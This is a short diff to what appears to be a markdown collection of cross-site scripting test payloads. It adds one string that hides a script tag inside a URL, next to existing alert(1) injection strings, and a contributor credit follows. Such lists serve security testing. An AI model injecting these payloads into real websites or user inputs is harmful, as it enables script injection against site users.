@@ -20,6 +20,7 @@
 '-alert(1)-'
 \'-alert(1)//
 javascript:alert(1)
+http://www.<script>alert(1)</script .com
 ```
 
 ## by Kira Reys
